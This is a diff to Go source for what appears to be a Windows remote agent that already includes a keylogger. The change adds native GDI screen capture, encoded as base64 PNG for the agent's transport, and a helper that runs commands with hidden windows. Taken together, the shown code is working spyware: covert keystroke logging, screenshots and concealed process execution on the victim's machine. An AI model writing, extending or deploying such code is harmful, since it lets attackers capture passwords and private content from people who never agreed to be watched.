@@ -3,9 +3,12 @@
 package main
 
 import (
+	"bytes"
 	"encoding/base64"
 	"errors"
 	"fmt"
+	"image"
+	"image/png"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -14,13 +17,53 @@ import (
 	"sync"
 	"syscall"
 	"time"
+	"unsafe"
 )
 
 var (
-	user32           = syscall.NewLazyDLL("user32.dll")
-	getAsyncKeyState = user32.NewProc("GetAsyncKeyState")
-	keylogger        = &windowsKeylogger{}
+	user32              = syscall.NewLazyDLL("user32.dll")
+	gdi32               = syscall.NewLazyDLL("gdi32.dll")
+	getAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
+	getSystemMetrics    = user32.NewProc("GetSystemMetrics")
+	getDC               = user32.NewProc("GetDC")
+	releaseDC           = user32.NewProc("ReleaseDC")
+	createCompatibleDC  = gdi32.NewProc("CreateCompatibleDC")
+	createCompatibleBmp = gdi32.NewProc("CreateCompatibleBitmap")
+	selectObject        = gdi32.NewProc("SelectObject")
+	bitBlt              = gdi32.NewProc("BitBlt")
+	getDIBits           = gdi32.NewProc("GetDIBits")
+	deleteObject        = gdi32.NewProc("DeleteObject")
+	deleteDC            = gdi32.NewProc("DeleteDC")
+	keylogger           = &windowsKeylogger{}
 )
+
+const (
+	smCXScreen   = 0
+	smCYScreen   = 1
+	srccopy      = 0x00CC0020
+	captureBlt   = 0x40000000
+	dibRGBColors = 0
+	biRGB        = 0
+)
+
+type bitmapInfoHeader struct {
+	Size          uint32
+	Width         int32
+	Height        int32
+	Planes        uint16
+	BitCount      uint16
+	Compression   uint32
+	SizeImage     uint32
+	XPelsPerMeter int32
+	YPelsPerMeter int32
+	ClrUsed       uint32
+	ClrImportant  uint32
+}
+
+type bitmapInfo struct {
+	Header bitmapInfoHeader
+	Colors [1]uint32
+}
 
 type windowsKeylogger struct {
 	mu      sync.Mutex
@@ -29,20 +72,83 @@ type windowsKeylogger struct {
 	stop    chan struct{}
 }
 
+func newCommand(name string, args ...string) *exec.Cmd {
+	command := exec.Command(name, args...)
+	command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	return command
+}
+
 func captureScreenshot() (string, error) {
-	// Windows PowerShell is present on supported Windows targets. The Go agent
-	// owns the operation and transport; PowerShell only supplies the desktop
-	// capture API, avoiding a third-party image dependency.
-	script := "$ErrorActionPreference='Stop'; Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $b=New-Object System.Drawing.Bitmap($s.Width,$s.Height); $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size); $m=New-Object System.IO.MemoryStream; $b.Save($m,[System.Drawing.Imaging.ImageFormat]::Png); [Convert]::ToBase64String($m.ToArray()); $g.Dispose(); $b.Dispose(); $m.Dispose()"
-	out, err := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script).CombinedOutput()
-	if err != nil {
-		return "", fmt.Errorf("PowerShell capture: %s", strings.TrimSpace(string(out)))
+	widthValue, _, _ := getSystemMetrics.Call(smCXScreen)
+	heightValue, _, _ := getSystemMetrics.Call(smCYScreen)
+	width := int(widthValue)
+	height := int(heightValue)
+	if width <= 0 || height <= 0 {
+		return "", errors.New("primary screen has invalid dimensions")
 	}
-	value := strings.TrimSpace(string(out))
-	if _, err := base64.StdEncoding.DecodeString(value); err != nil {
-		return "", errors.New("PowerShell returned invalid PNG data")
+
+	screenDC, _, _ := getDC.Call(0)
+	if screenDC == 0 {
+		return "", errors.New("GetDC failed")
 	}
-	return value, nil
+	defer releaseDC.Call(0, screenDC)
+
+	memoryDC, _, _ := createCompatibleDC.Call(screenDC)
+	if memoryDC == 0 {
+		return "", errors.New("CreateCompatibleDC failed")
+	}
+	defer deleteDC.Call(memoryDC)
+
+	bitmap, _, _ := createCompatibleBmp.Call(screenDC, uintptr(width), uintptr(height))
+	if bitmap == 0 {
+		return "", errors.New("CreateCompatibleBitmap failed")
+	}
+	defer deleteObject.Call(bitmap)
+
+	previous, _, _ := selectObject.Call(memoryDC, bitmap)
+	if previous == 0 {
+		return "", errors.New("SelectObject failed")
+	}
+	defer selectObject.Call(memoryDC, previous)
+
+	if result, _, _ := bitBlt.Call(memoryDC, 0, 0, uintptr(width), uintptr(height), screenDC, 0, 0, srccopy|captureBlt); result == 0 {
+		return "", errors.New("BitBlt failed")
+	}
+
+	pixels := make([]byte, width*height*4)
+	info := bitmapInfo{Header: bitmapInfoHeader{
+		Size:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
+		Width:       int32(width),
+		Height:      -int32(height),
+		Planes:      1,
+		BitCount:    32,
+		Compression: biRGB,
+	}}
+	rows, _, _ := getDIBits.Call(
+		memoryDC,
+		bitmap,
+		0,
+		uintptr(height),
+		uintptr(unsafe.Pointer(&pixels[0])),
+		uintptr(unsafe.Pointer(&info)),
+		dibRGBColors,
+	)
+	if rows != uintptr(height) {
+		return "", errors.New("GetDIBits failed")
+	}
+
+	rgba := image.NewRGBA(image.Rect(0, 0, width, height))
+	for i := 0; i < len(pixels); i += 4 {
+		rgba.Pix[i] = pixels[i+2]
+		rgba.Pix[i+1] = pixels[i+1]
+		rgba.Pix[i+2] = pixels[i]
+		rgba.Pix[i+3] = 0xff
+	}
+	var encoded bytes.Buffer
+	if err := png.Encode(&encoded, rgba); err != nil {
+		return "", fmt.Errorf("encode screenshot: %w", err)
+	}
+	return base64.StdEncoding.EncodeToString(encoded.Bytes()), nil
 }
 
 func keylogAction(action string) (string, string, error) {
